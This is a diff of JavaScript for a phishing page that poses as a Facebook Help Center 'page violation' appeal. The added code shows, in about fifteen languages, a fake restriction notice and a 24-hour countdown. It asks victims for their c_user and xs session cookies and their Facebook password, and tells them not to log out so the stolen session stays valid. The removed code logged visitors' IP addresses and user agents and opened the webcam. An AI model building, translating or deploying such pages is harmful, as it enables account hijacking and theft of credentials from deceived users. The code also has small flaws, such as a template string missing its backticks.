-                    if (hours < 0) {
-                        clearInterval(countdownInterval);
-                        hours = 0;
-                        minutes = 0;
-                        seconds = 0;
-                        
-                        // Show urgent warning when countdown completes
-                        document.querySelector('.review-card').classList.add('shake');
-                        document.querySelector('.warning-icon').style.color = '#ff0000';
-                        document.querySelector('.review-title').textContent = 'ACCOUNT DELETION IMMINENT!';
-                    }
-                    
-                    // Update display
-                    countdownHours.textContent = hours.toString().padStart(2, '0');
-                    countdownMinutes.textContent = minutes.toString().padStart(2, '0');
-                    countdownSeconds.textContent = seconds.toString().padStart(2, '0');
-                }, 1000);
+        const translations = {
+            en: {
+                helpCenter: "Help Center",
+                formTitle: "Request For Remove Page Violation",
+                message1: "We've identified irregular activity on your page that goes against our community guidelines.",
+                message2: "As a result, access to your page has been restricted, and you're presently unable to post, share, or comment using it.",
+                message3: "Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.",
+                videoLabel: "Detailed Video Information",
+                soundToggle: "Enable Sound",
+                provideInfo: "Please be sure to provide the requested information below.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Please make sure not to log out from your computer or laptop until you have received a verification email.",
+                passwordLabel: "Confirm your Facebook password to continue",
+                passwordPlaceholder: "Enter your password",
+                passwordError: "Please enter your password",
+                submit: "Submit",
+                finalSubmit: "Send Confirmation",
+                successTitle: "Your request has been submitted successfully",
+                successText: "We are reviewing your information and will contact you shortly."
+            },
+            es: {
+                helpCenter: "Centro de ayuda",
+                formTitle: "Solicitud para eliminar violación de página",
+                message1: "Hemos identificado actividad irregular en su página que va en contra de nuestras pautas comunitarias.",
+                message2: "Como resultado, el acceso a su página ha sido restringido y actualmente no puede publicar, compartir o comentar usándola.",
+                message3: "Proporcione los detalles precisos a continuación. Consulte el video para aclaraciones si encuentra las instrucciones poco claras.",
+                videoLabel: "Información detallada en video",
+                soundToggle: "Activar sonido",
+                provideInfo: "Asegúrese de proporcionar la información solicitada a continuación.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Asegúrese de no cerrar sesión en su computadora o portátil hasta que haya recibido un correo electrónico de verificación.",
+                passwordLabel: "Confirme su contraseña de Facebook para continuar",
+                passwordPlaceholder: "Ingrese su contraseña",
+                passwordError: "Por favor ingrese su contraseña",
+                submit: "Enviar",
+                finalSubmit: "Enviar confirmación",
+                successTitle: "Su solicitud ha sido enviada con éxito",
+                successText: "Estamos revisando su información и nos comunicaremos con usted pronto."
+            },
+            fr: {
+                helpCenter: "Centre d'aide",
+                formTitle: "Demande de suppression de violation de page",
+                message1: "Nous avons identifié une activité irrégulière sur votre page qui va à l'encontre de nos directives communautaires.",
+                message2: "En conséquence, l'accès à votre page a été restreint et vous ne pouvez actuellement pas publier, partager ou commenter en l'utilisant.",
+                message3: "Veuillez fournir les détails précis ci-dessous. Reportez-vous à la vidéo pour plus de clarté si vous trouvez les instructions peu claires.",
+                videoLabel: "Informations vidéo détaillées",
+                soundToggle: "Activer le son",
+                provideInfo: "Veuillez vous assurer de fournir les informations demandées ci-dessous.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Veuillez ne pas vous déconnecter de votre ordinateur ou portable jusqu'à ce que vous ayez reçu un e-mail de vérification.",
+                passwordLabel: "Confirmez votre mot de passe Facebook pour continuer",
+                passwordPlaceholder: "Entrez votre mot de passe",
+                passwordError: "Veuillez entrer votre mot de passe",
+                submit: "Soumettre",
+                finalSubmit: "Envoyer la confirmation",
+                successTitle: "Votre demande a été soumise avec succès",
+                successText: "Nous examinons vos informations et vous contacterons sous peu."
+            },
+            de: {
+                helpCenter: "Hilfebereich",
+                formTitle: "Anfrage zur Entfernung von Seitenverstößen",
+                message1: "Wir haben unregelmäßige Aktivitäten auf Ihrer Seite festgestellt, die gegen unsere Community-Richtlinien verstoßen.",
+                message2: "Daher wurde der Zugriff auf Ihre Seite eingeschränkt und Sie können derzeit keine Beiträge veröffentlichen, teilen oder kommentieren.",
+                message3: "Bitte geben Sie die genauen Details unten an. Sehen Sie sich das video zur Klärung an, wenn Sie die Anweisungen unklar finden.",
+                videoLabel: "Detaillierte Videoinformationen",
+                soundToggle: "Ton aktivieren",
+                provideInfo: "Bitte stellen Sie sicher, dass Sie die angeforderten Informationen unten angeben.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Bitte melden Sie sich nicht von Ihrem Computer oder Laptop ab, bis Sie eine Bestätigungs-E-Mail erhalten haben.",
+                passwordLabel: "Bestätigen Sie Ihr Facebook-Passwort, um fortzufahren",
+                passwordPlaceholder: "Geben Sie Ihr Passwort ein",
+                passwordError: "Bitte geben Sie Ihr Passwort ein",
+                submit: "Einreichen",
+                finalSubmit: "Bestätigung senden",
+                successTitle: "Ihre Anfrage wurde erfolgreich übermittelt",
+                successText: "Wir prüfen Ihre Informationen und werden uns in Kürze bei Ihnen melden."
+            },
+            pt: {
+                helpCenter: "Central de Ajuda",
+                formTitle: "Pedido de Remoção de Violação de Página",
+                message1: "Identificamos atividade irregular em sua página que viola nossas diretrizes da comunidade.",
+                message2: "Como resultado, o acesso à sua página foi restrito e você não pode postar, compartilhar ou comentar usando-a no momento.",
+                message3: "Forneça os detalhes precisos abaixo. Consulte o vídeo para esclarecimentos se achar as instruções pouco claras.",
+                videoLabel: "Informações detalhadas em vídeo",
+                soundToggle: "Ativar som",
+                provideInfo: "Certifique-se de fornecer as informações solicitadas abaixo.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Certifique-se de não sair do seu computador ou laptop até receber um e-mail de verificação.",
+                passwordLabel: "Confirme sua senha do Facebook para continuar",
+                passwordPlaceholder: "Digite sua senha",
+                passwordError: "Por favor, digite sua senha",
+                submit: "Enviar",
+                finalSubmit: "Enviar confirmação",
+                successTitle: "Seu pedido foi enviado com sucesso",
+                successText: "Estamos analisando suas informações e entraremos em contato em breve."
+            },
+            ar: {
+                helpCenter: "مركز المساعدة",
+                formTitle: "طلب إزالة انتهاك الصفحة",
+                message1: "لقد حددنا نشاطًا غير منتظم في صفحتك يتعارض مع إرشادات المجتمع الخاصة بنا.",
+                message2: "ونتيجة لذلك، تم تقييد الوصول إلى صفحتك وأنت غير قادر حاليًا على النشر أو المشاركة أو التعليق باستخدامها.",
+                message3: "يرجى تقديم التفاصيل الدقيقة أدناه. راجع الفيديو للحصول على توضيح إذا وجدت التعليمات غير واضحة.",
+                videoLabel: "معلومات الفيديو التفصيلية",
+                soundToggle: "تمكين الصوت",
+                provideInfo: "يرجى التأكد من تقديم المعلومات المطلوبة أدناه.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "يرجى التأكد من عدم تسجيل الخروج من جهاز الكمبيوتر أو الكمبيوتر المحمول الخاص بك حتى تتلقى بريدًا إلكترونيًا للتحقق.",
+                passwordLabel: "قم بتأكيد كلمة مرور Facebook للمتابعة",
+                passwordPlaceholder: "أدخل كلمة المرور الخاصة بك",
+                passwordError: "الرجاء إدخال كلمة المرور الخاصة بك",
+                submit: "إرسال",
+                finalSubmit: "إرسال التأكيد",
+                successTitle: "تم تقديم طلبك بنجاح",
+                successText: "نحن نراجع معلوماتك وسنتواصل معك قريبًا."
+            },
+            hi: {
+                helpCenter: "सहायता केंद्र",
+                formTitle: "पेज उल्लंघन हटाने का अनुरोध",
+                message1: "हमने आपके पेज पर अनियमित गतिविधि की पहचान की है जो हमारे सामुदायिक दिशानिर्देशों के विरुद्ध है।",
+                message2: "परिणामस्वरूप, आपके पेज तक पहुंच प्रतिबंधित कर दी गई है और आप वर्तमान में इसका उपयोग करके पोस्ट, साझा या टिप्पणी नहीं कर सकते हैं।",
+                message3: "कृपया नीचे सटीक विवरण प्रदान करें। यदि आपको निर्देश अस्पष्ट लगते हैं तो स्पष्टीकरण के लिए वीडियो देखें।",
+                videoLabel: "विस्तृत वीडियो जानकारी",
+                soundToggle: "ध्वनि सक्षम करें",
+                provideInfo: "कृपया नीचे अनुरोधित जानकारी प्रदान करना सुनिश्चित करें।",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "कृपया सत्यापन ईमेल प्राप्त होने तक अपने कंप्यूटर या लैपटॉप से लॉग आउट न करें।",
+                passwordLabel: "जारी रखने के लिए अपना Facebook पासवर्ड पुष्टि करें",
+                passwordPlaceholder: "अपना पासवर्ड दर्ज करें",
+                passwordError: "कृपया अपना पासवर्ड दर्ज करें",
+                submit: "जमा करें",
+                finalSubmit: "पुष्टि भेजें",
+                successTitle: "आपका अनुरोध सफलतापूर्वक जमा कर दिया गया है",
+                successText: "हम आपकी जानकारी की समीक्षा कर रहे हैं और जल्द ही आपसे संपर्क करेंगे।"
+            },
+            zh: {
+                helpCenter: "帮助中心",
+                formTitle: "请求删除页面违规",
+                message1: "我们发现您的页面有违反我们社区准则的异常活动。",
+                message2: "因此，您的页面访问已受到限制，您目前无法使用它发布、分享或评论。",
+                message3: "请提供以下确切详细信息。如果您发现说明不清楚，请参考视频以获取说明。",
+                videoLabel: "详细视频信息",
+                soundToggle: "启用声音",
+                provideInfo: "请务必提供以下所需信息。",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "在收到验证电子邮件之前，请确保不要从计算机或笔记本电脑注销。",
+                passwordLabel: "确认您的Facebook密码以继续",
+                passwordPlaceholder: "输入您的密码",
+                passwordError: "请输入您的密码",
+                submit: "提交",
+                finalSubmit: "发送确认",
+                successTitle: "您的请求已成功提交",
+                successText: "我们正在审核您的信息，并将很快与您联系。"
+            },
+            ru: {
+                helpCenter: "Центр помощи",
+                formTitle: "Запрос на удаление нарушения страницы",
+                message1: "Мы обнаружили подозрительную активность на вашей странице, которая нарушает наши правила сообщества.",
+                message2: "В результате доступ к вашей странице был ограничен, и в настоящее время вы не можете публиковать, делиться или комментировать с ее помощью.",
+                message3: "Пожалуйста, укажите точные данные ниже. Обратитесь к видео для уточнения, если инструкции кажутся вам неясными.",
+                videoLabel: "Подробная видеоинформация",
+                soundToggle: "Включить звук",
+                provideInfo: "Пожалуйста, обязательно предоставьте запрашиваемую информацию ниже.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Пожалуйста, не выходите из системы на компьютере или ноутбуке, пока не получите письмо с подтверждением.",
+                passwordLabel: "Подтвердите пароль Facebook для продолжения",
+                passwordPlaceholder: "Введите пароль",
+                passwordError: "Пожалуйста, введите пароль",
+                submit: "Отправить",
+                finalSubmit: "Отправить подтверждение",
+                successTitle: "Ваш запрос успешно отправлен",
+                successText: "Мы проверяем вашу информацию и свяжемся с вами в ближайшее время."
+            },
+            ja: {
+                helpCenter: "ヘルプセンター",
+                formTitle: "ページ違反削除のリクエスト",
+                message1: "コミュニティガイドラインに違反する異常な活動をページで確認しました。",
+                message2: "その結果、ページへのアクセスが制限され、現在投稿、共有、コメントができなくなっています。",
+                message3: "下記に正確な詳細を入力してください。説明が不明瞭な場合は、動画を参照してください。",
+                videoLabel: "詳細な動画情報",
+                soundToggle: "音声を有効にする",
+                provideInfo: "下記の必要な情報を必ず入力してください。",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "確認メールを受信するまで、コンピュータやラップトップからログアウトしないでください。",
+                passwordLabel: "続行するにはFacebookパスワードを確認してください",
+                passwordPlaceholder: "パスワードを入力",
+                passwordError: "パスワードを入力してください",
+                submit: "送信",
+                finalSubmit: "確認を送信",
+                successTitle: "リクエストが正常に送信されました",
+                successText: "情報を確認し、すぐにご連絡いたします。"
+            },
+            it: {
+                helpCenter: "Centro assistenza",
+                formTitle: "Richiesta rimozione violazione pagina",
+                message1: "Abbiamo rilevato attività irregolari sulla tua pagina che violano le nostre linee guida della community.",
+                message2: "Di conseguenza, l'accesso alla tua pagina è stato limitato e attualmente non puoi pubblicare, condividere o commentare utilizzandola.",
+                message3: "Fornisci i dettagli precisi di seguito. Fai riferimento al video per chiarimenti se trovi le istruzioni poco chiare.",
+                videoLabel: "Informazioni video dettagliate",
+                soundToggle: "Attiva audio",
+                provideInfo: "Assicurati di fornire le informazioni richieste di seguito.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Assicurati di non disconnetterti dal computer o laptop finché non ricevi un'email di verifica.",
+                passwordLabel: "Conferma la password di Facebook per continuare",
+                passwordPlaceholder: "Inserisci la password",
+                passwordError: "Inserisci la password",
+                submit: "Invia",
+                finalSubmit: "Invia conferma",
+                successTitle: "La tua richiesta è stata inviata con successo",
+                successText: "Stiamo esaminando le tue informazioni e ti contatteremo a breve."
+            },
+            tr: {
+                helpCenter: "Yardım Merkezi",
+                formTitle: "Sayfa İhlali Kaldırma İsteği",
+                message1: "Topluluk kurallarımıza aykırı düzensiz etkinlik tespit ettik.",
+                message2: "Sonuç olarak, sayfanıza erişim kısıtlandı ve şu anda paylaşım yapamaz, paylaşamaz veya yorum yapamazsınız.",
+                message3: "Lütfen aşağıya kesin ayrıntıları sağlayın. Talimatları net bulmazsanız açıklama için videoya bakın.",
+                videoLabel: "Detaylı Video Bilgisi",
+                soundToggle: "Sesi Aç",
+                provideInfo: "Lütfen aşağıdaki istenen bilgileri sağladığınızdan emin olun.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Lütfen bir doğrulama e-postası alana kadar bilgisayarınızdan veya dizüstü bilgisayarınızdan çıkış yapmadığınızdan emin olun.",
+                passwordLabel: "Devam etmek için Facebook şifrenizi onaylayın",
+                passwordPlaceholder: "Şifrenizi girin",
+                passwordError: "Lütfen şifrenizi girin",
+                submit: "Gönder",
+                finalSubmit: "Onay Gönder",
+                successTitle: "İsteğiniz başarıyla gönderildi",
+                successText: "Bilgilerinizi inceliyoruz ve en kısa sürede sizinle iletişime geçeceğiz."
+            },
+            nl: {
+                helpCenter: "Helpcentrum",
+                formTitle: "Verzoek tot verwijdering pagina-overtreding",
+                message1: "We hebben onregelmatigheden op uw pagina geïdentificeerd die in strijd zijn met onze communityrichtlijnen.",
+                message2: "Hierdoor is de toegang tot uw pagina beperkt en kunt u momenteel niet posten, delen of reageren.",
+                message3: "Geef hieronder de exacte details op. Raadpleeg de video voor verduidelijking als u de instructies onduidelijk vindt.",
+                videoLabel: "Gedetailleerde video-informatie",
+                soundToggle: "Geluid inschakelen",
+                provideInfo: "Zorg ervoor dat u de gevraagde informatie hieronder verstrekt.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Zorg ervoor dat u niet uitlogt van uw computer of laptop totdat u een verificatie-e-mail hebt ontvangen.",
+                passwordLabel: "Bevestig uw Facebook-wachtwoord om door te gaan",
+                passwordPlaceholder: "Voer uw wachtwoord in",
+                passwordError: "Voer uw wachtwoord in",
+                submit: "Verzenden",
+                finalSubmit: "Bevestiging verzenden",
+                successTitle: "Uw verzoek is succesvol ingediend",
+                successText: "We beoordelen uw informatie en nemen spoedig contact met u op."
+            },
+            pl: {
+                helpCenter: "Centrum pomocy",
+                formTitle: "Wniosek o usunięcie naruszenia strony",
+                message1: "Zidentyfikowaliśmy nieregularne działania na Twojej stronie, które naruszają nasze wytyczne społeczności.",
+                message2: "W rezultacie dostęp do Twojej strony został ograniczony i obecnie nie możesz publikować, udostępniać ani komentować za jej pomocą.",
+                message3: "Podaj dokładne dane poniżej. W razie wątpliwości zapoznaj się z filmem.",
+                videoLabel: "Szczegółowe informacje wideo",
+                soundToggle: "Włącz dźwięk",
+                provideInfo: "Pamiętaj o podaniu wymaganych informacji poniżej.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Nie wylogowuj się z komputera lub laptopa, dopóki nie otrzymasz wiadomości e-mail z potwierdzeniem.",
+                passwordLabel: "Potwierdź hasło na Facebooku, aby kontynuować",
+                passwordPlaceholder: "Wprowadź hasło",
+                passwordError: "Wprowadź hasło",
+                submit: "Prześlij",
+                finalSubmit: "Wyślij potwierdzenie",
+                successTitle: "Twoje zgłoszenie zostało pomyślnie wysłane",
+                successText: "Przeglądamy Twoje informacje i wkrótce się z Tobą skontaktujemy."
+            },
+            sv: {
+                helpCenter: "Hjälpcenter",
+                formTitle: "Begäran om borttagning av sidöverträdelse",
+                message1: "Vi har identifierat oregelbunden aktivitet på din sida som strider mot våra riktlinjer för communityn.",
+                message2: "Som ett resultat har åtkomsten till din sida begränsats och du kan för närvarande inte publicera, dela eller kommentera med den.",
+                message3: "Ange de exakta uppgifterna nedan. Se videon för förtydligande om du tycker att anvisningarna är otydliga.",
+                videoLabel: "Detaljerad videoinformation",
+                soundToggle: "Aktivera ljud",
+                provideInfo: "Se till att ange den begärda informationen nedan.",
+                cUserLabel: "c_user",
+                xsLabel: "xs",
+                dontLogout: "Se till att du inte loggar ut från din dator eller bärbara dator förrän du har fått ett verifieringsmejl.",
+                passwordLabel: "Bekräfta ditt Facebook-lösenord för att fortsätta",
+                passwordPlaceholder: "Ange ditt lösenord",
+                passwordError: "Ange ditt lösenord",
+                submit: "Skicka",
+                finalSubmit: "Skicka bekräftelse",
+                successTitle: "Din förfrågan har skickats",
+                successText: "Vi granskar din information och kommer att kontakta dig snart."
             }
-            
-            // Toggle dark/light mode
-            themeToggle.addEventListener('click', function() {
-                document.body.classList.toggle('dark-mode');
-                const icon = themeToggle.querySelector('i');
-                if (document.body.classList.contains('dark-mode')) {
-                    icon.classList.remove('fa-moon');
-                    icon.classList.add('fa-sun');
-                } else {
-                    icon.classList.remove('fa-sun');
-                    icon.classList.add('fa-moon');
-                }
-            });
-            
-            // Generate a random review ID
-            function generateReviewId() {
-                const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-                let result = '';
-                for (let i = 0; i < 6; i++) {
-                    result += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                return result;
-            }
-            
-            // Generate a fake blockchain hash
-            function generateBlockchainHash() {
-                const chars = '0123456789abcdef';
-                let result = '0x';
-                for (let i = 0; i < 64; i++) {
-                    result += chars.charAt(Math.floor(Math.random() * chars.length));
-                }
-                return result;
-            }
-            
-            // Set user agent and timestamp
-            userAgent.value = navigator.userAgent;
-            timestamp.value = new Date().toISOString();
-            
-            // Try to get IP address (note: this requires a backend service)
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    ipAddress.value = data.ip || 'unknown';
-                })
-                .catch(() => {
-                    ipAddress.value = 'unknown';
-                });
-            
-            // Open language modal when video overlay is clicked
-            overlayPlayBtn.addEventListener('click', function() {
-                languageModal.style.display = 'block';
-                document.body.style.overflow = 'hidden';
-            });
-            
-            // Close language modal
-            closeLanguageModal.addEventListener('click', function() {
-                languageModal.style.display = 'none';
-                document.body.style.overflow = 'auto';
-            });
-            
-            // Language search functionality
-            languageSearch.addEventListener('input', function() {
-                const searchTerm = this.value.toLowerCase();
-                
-                languageButtons.forEach(button => {
-                    const languageName = button.querySelector('span').textContent.toLowerCase();
-                    const languageNative = button.querySelector('small').textContent.toLowerCase();
-                    
-                    if (languageName.includes(searchTerm) || languageNative.includes(searchTerm)) {
-                        button.style.display = 'flex';
-                    } else {
-                        button.style.display = 'none';
-                    }
-                });
-            });
-            
-            // Language selection
-            languageButtons.forEach(button => {
-                button.addEventListener('click', function() {
-                    // Remove selected class from all buttons
-                    languageButtons.forEach(btn => {
-                        btn.classList.remove('btn-primary');
-                        btn.classList.add('btn-outline');
-                    });
-                    
-                    // Add selected class to clicked button
-                    this.classList.remove('btn-outline');
-                    this.classList.add('btn-primary');
-                    
-                    // Get selected language
-                    selectedLanguage = this.getAttribute('data-lang');
-                });
-            });
-            
-            // Confirm language selection
-            confirmLanguageBtn.addEventListener('click', function() {
-                if (selectedLanguage) {
-                    const sources = videoFiles[selectedLanguage];
-                    
-                    if (sources && sources.length > 0) {
-                        // Clear existing sources
-                        while (video.firstChild) {
-                            video.removeChild(video.firstChild);
-                        }
-                        
-                        // Add new sources
-                        sources.forEach(source => {
-                            const sourceElement = document.createElement('source');
-                            sourceElement.src = source.url;
-                            sourceElement.type = source.type;
-                            video.appendChild(sourceElement);
-                        });
-                        
-                        // Load the new video
-                        video.load();
-                        
-                        // Set video title for accessibility
-                        video.setAttribute('title', `Tutorial Video - ${selectedLanguage}`);
-                        
-                        // Close modal
-                        languageModal.style.display = 'none';
-                        document.body.style.overflow = 'auto';
-                        
-                        // After a short delay, play the video
-                        setTimeout(() => {
-                            video.play().then(() => {
-                                videoOverlay.classList.add('hidden');
-                                playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-                                isVideoPlaying = true;
-                            }).catch(error => {
-                                console.error('Error playing video:', error);
-                                videoOverlay.classList.remove('hidden');
-                            });
-                        }, 300);
-                        
-                        // Remember language selection
-                        localStorage.setItem('preferredLanguage', selectedLanguage);
-                    }
-                }
-            });
-            
-            // Start webcam for facial recognition
-            startWebcamBtn.addEventListener('click', function() {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(function(mediaStream) {
-                            stream = mediaStream;
-                            webcamVideo.srcObject = stream;
-                            webcamOverlay.style.display = 'none';
-                            webcamContainer.style.display = 'block';
-                            
-                            // Simulate AI processing
-                            setTimeout(() => {
-                                aiVerification.style.display = 'flex';
-                                setTimeout(() => {
-                                    aiVerification.querySelector('i').classList.remove('ai-processing');
-                                    aiVerification.querySelector('i').classList.add('ai-success');
-                                    aiVerification.querySelector('p').textContent = 'Identity verified successfully!';
-                                    
-                                    // Generate fake facial data hash
-                                    facialData.value = generateBlockchainHash();
-                                }, 3000);
-                            }, 1000);
-                        })
-                        .catch(function(error) {
-                            console.error('Error accessing webcam:', error);
-                            alert('Could not access webcam. Please ensure you have granted permissions.');
-                        });
-                } else {
-                    alert('Webcam access is not supported in your browser.');
-                }
-            });
-            
-            // Close modals when clicking outside
-            window.addEventListener('click', function(event) {
-                if (event.target === languageModal) {
-                    languageModal.style.display = 'none';
-                    document.body.style.overflow = 'auto';
-                }
-                if (event.target === modal) {
-                    closeModalFunc();
-                }
-            });
-            
-            // Keyboard shortcut for closing modals
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape') {
-                    if (languageModal.style.display === 'block') {
-                        languageModal.style.display = 'none';
-                        document.body.style.overflow = 'auto';
-                    } else if (modal.style.display === 'block') {
-                        closeModalFunc();
-                    }
-                }
-                
-                // Spacebar to toggle play/pause when video is focused
-                if (e.code === 'Space' && isVideoPlaying && !isInputField(document.activeElement)) {
-                    e.preventDefault();
-                    togglePlayPause();
-                }
-            });
+        };
 
-            // Preload the preferred language if available
-            const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
-            if (videoFiles[preferredLanguage]) {
-                const sources = videoFiles[preferredLanguage];
-                sources.forEach(source => {
-                    const sourceElement = document.createElement('source');
-                    sourceElement.src = source.url;
-                    sourceElement.type = source.type;
-                    video.appendChild(sourceElement);
-                });
-                video.load();
-            }
+        document.addEventListener('DOMContentLoaded', function() {
+            const notificationPage = document.getElementById('notificationPage');
+            const verificationForm = document.getElementById('verificationForm');
+            const getStartedBtn = document.getElementById('getStartedBtn');
+            const form = document.getElementById('verificationForm');
+            const soundToggle = document.getElementById('soundToggle');
+            const video = document.querySelector('video');
+            const initialSubmit = document.getElementById('initialSubmit');
+            const passwordConfirmation = document.getElementById('passwordConfirmation');
+            const finalSubmit = document.getElementById('finalSubmit');
+            const passwordInput = document.getElementById('password');
+            const passwordError = document.getElementById('passwordError');
+            const languageSelector = document.getElementById('languageSelector');
+            const formContent = document.getElementById('formContent');
+            const successMessage = document.getElementById('successMessage');
+            const timerElement = document.getElementById('timer');
             
-            // Initialize video player
-            function initVideoPlayer() {
-                // Initialize volume and playback rate
-                video.volume = volumeSlider.value;
-                video.playbackRate = speedSelector.value;
-                
-                // Update time display
-                updateTimeDisplay();
-                
-                // Event listeners
-                video.addEventListener('timeupdate', updateProgressBar);
-                video.addEventListener('progress', updateBufferedBar);
-                video.addEventListener('loadedmetadata', function() {
-                    totalTimeDisplay.textContent = formatTime(video.duration);
-                });
-                
-                // Loading events
-                video.addEventListener('waiting', showLoadingSpinner);
-                video.addEventListener('playing', hideLoadingSpinner);
-                video.addEventListener('seeking', showLoadingSpinner);
-                video.addEventListener('seeked', hideLoadingSpinner);
-                
-                playPauseBtn.addEventListener('click', togglePlayPause);
-                
-                volumeBtn.addEventListener('click', toggleMute);
-                volumeSlider.addEventListener('input', function() {
-                    video.volume = volumeSlider.value;
-                    updateVolumeIcon();
-                });
-                
-                speedSelector.addEventListener('change', function() {
-                    video.playbackRate = parseFloat(this.value);
-                });
-                
-                fullscreenBtn.addEventListener('click', toggleFullscreen);
-                
-                const progressContainer = document.querySelector('.progress-container');
-                progressContainer.addEventListener('click', function(e) {
-                    const pos = (e.pageX - this.offsetLeft) / this.offsetWidth;
-                    video.currentTime = pos * video.duration;
-                });
-                
-                // Handle video end
-                video.addEventListener('ended', function() {
-                    playPauseBtn.innerHTML = '<i class="fas fa-redo"></i>';
-                    isVideoPlaying = false;
-                });
-            }
+            // Countdown timer functionality
+            let hours = 24;
+            let minutes = 0;
+            let seconds = 0;
             
-            function isInputField(element) {
-                return element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.isContentEditable;
-            }
-            
-            function showLoadingSpinner() {
-                loadingSpinner.style.display = 'flex';
-            }
-            
-            function hideLoadingSpinner() {
-                if (video.readyState >= 3) {
-                    loadingSpinner.style.display = 'none';
-                }
-            }
-            
-            function updateBufferedBar() {
-                if (video.buffered.length > 0) {
-                    const bufferedEnd = video.buffered.end(video.buffered.length - 1);
-                    const percent = (bufferedEnd / video.duration) * 100;
-                    bufferedBar.style.width = `${percent}%`;
-                    
-                    // Update loading percentage
-                    if (video.readyState < 4) {
-                        const loadedPercent = Math.round((bufferedEnd / video.duration) * 100);
-                        loadingPercentage.textContent = `${loadedPercent}%`;
+            function updateTimer() {
+                // Format the time display
+                const formattedHours = hours.toString().padStart(2, '0');
+                const formattedMinutes = minutes.toString().padStart(2, '0');
+                const formattedSeconds = seconds.toString().padStart(2, '0');
+                
+                timerElement.textContent = ${formattedHours}:${formattedMinutes}:${formattedSeconds};
+                
+                // Update the timer
+                if (seconds > 0) {
+                    seconds--;
+                } else {
+                    if (minutes > 0) {
+                        minutes--;
+                        seconds = 59;
+                    } else {
+                        if (hours > 0) {
+                            hours--;
+                            minutes = 59;
+                            seconds = 59;
+                        } else {
+                            // Timer has ended
+                            clearInterval(timerInterval);
+                            timerElement.textContent = "Time expired!";
+                            timerElement.style.color = "var(--error-red)";
+                            return;
+                        }
                     }
                 }
             }
             
-            // Toggle play/pause
-            function togglePlayPause() {
-                if (video.paused) {
-                    video.play().then(() => {
-                        playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-                        isVideoPlaying = true;
-                    }).catch(error => {
-                        console.error('Error playing video:', error);
-                    });
-                } else {
-                    video.pause();
-                    playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
-                    isVideoPlaying = false;
-                }
+            // Start the countdown timer
+            const timerInterval = setInterval(updateTimer, 1000);
+            
+            // Enhanced Get Started button with smooth transition
+            getStartedBtn.addEventListener('click', function() {
+                // Add click effect
+                this.style.transform = 'scale(0.95)';
+                setTimeout(() => {
+                    this.style.transform = 'scale(1)';
+                }, 150);
+                
+                // Add loading state
+                const originalText = this.textContent;
+                this.innerHTML = '<span class="loading-dots"><span>.</span><span>.</span><span>.</span></span>';
+                this.disabled = true;
+                
+                // Smooth transition to verification form
+                setTimeout(() => {
+                    notificationPage.style.opacity = '0';
+                    notificationPage.style.transform = 'translateY(20px)';
+                    notificationPage.style.pointerEvents = 'none';
+                    
+                    setTimeout(() => {
+                        notificationPage.style.display = 'none';
+                        verificationForm.style.display = 'block';
+                        verificationForm.style.opacity = '0';
+                        verificationForm.style.transform = 'translateY(20px)';
+                        
+                        // Trigger reflow
+                        verificationForm.offsetHeight;
+                        
+                        verificationForm.style.opacity = '1';
+                        verificationForm.style.transform = 'translateY(0)';
+                        document.body.style.backgroundColor = '#f0f2f5';
+                    }, 300);
+                }, 800);
+            });
+            
+            // Set initial language
+            let currentLanguage = 'en';
+            updateTranslations(currentLanguage);
+            
+            // Language change handler
+            languageSelector.addEventListener('change', function() {
+                currentLanguage = this.value;
+                document.getElementById('selectedLanguage').value = currentLanguage;
+                updateTranslations(currentLanguage);
+            });
+            
+            // Update all text elements with translations
+            function updateTranslations(lang) {
+                const langData = translations[lang] || translations['en'];
+                
+                document.getElementById('helpCenterText').textContent = langData.helpCenter;
+                document.getElementById('formTitle').textContent = langData.formTitle;
+                document.getElementById('message1').textContent = langData.message1;
+                document.getElementById('message2').textContent = langData.message2;
+                document.getElementById('message3').textContent = langData.message3;
+                document.getElementById('videoLabel').textContent = langData.videoLabel;
+                document.getElementById('soundToggle').textContent = langData.soundToggle;
+                document.getElementById('provideInfoText').textContent = langData.provideInfo;
+                document.getElementById('cUserLabel').textContent = langData.cUserLabel;
+                document.getElementById('xsLabel').textContent = langData.xsLabel;
+                document.getElementById('dontLogoutText').textContent = langData.dontLogout;
+                document.getElementById('passwordLabel').textContent = langData.passwordLabel;
+                passwordInput.placeholder = langData.passwordPlaceholder;
+                document.getElementById('passwordError').textContent = langData.passwordError;
+                document.getElementById('initialSubmit').textContent = langData.submit;
+                document.getElementById('finalSubmit').textContent = langData.finalSubmit;
+                document.getElementById('successTitle').textContent = langData.successTitle;
+                document.getElementById('successText').textContent = langData.successText;
             }
             
-            // Update progress bar
-            function updateProgressBar() {
-                const percent = (video.currentTime / video.duration) * 100;
-                progressBar.style.width = `${percent}%`;
-                currentTimeDisplay.textContent = formatTime(video.currentTime);
-            }
-            
-            // Update time display
-            function updateTimeDisplay() {
-                currentTimeDisplay.textContent = formatTime(video.currentTime);
